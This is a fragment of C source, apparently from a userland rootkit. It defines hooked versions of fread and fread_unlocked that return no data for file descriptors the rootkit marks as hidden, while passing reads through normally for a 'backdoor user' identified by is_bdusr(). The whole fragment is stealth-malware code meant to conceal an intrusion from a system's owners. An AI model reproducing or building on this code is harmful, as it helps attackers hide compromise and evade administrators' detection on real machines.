size_t fread_t(void *data, size_t size, size_t count, FILE *stream){
	hook(CFREAD);
	if(is_bdusr())
		return (size_t)call(CFREAD, data, size, count, stream);
	if(hidden_fd(fileno(stream)))
		return 0;
	return (size_t)call(CFREAD, data, size, count, stream);
}

size_t fread_unlocked_r(void *data, size_t size, size_t count, FILE *stream){
	hook(CFREAD_UNLOCKED);
	if(is_bdusr())
		return (size_t)call(CFREAD_UNLOCKED, data, size, count, stream);
	if(hidden_fd(fileno(stream)))
		return 0;
	return (size_t)call(CFREAD_UNLOCKED, data, size, count, stream);
}
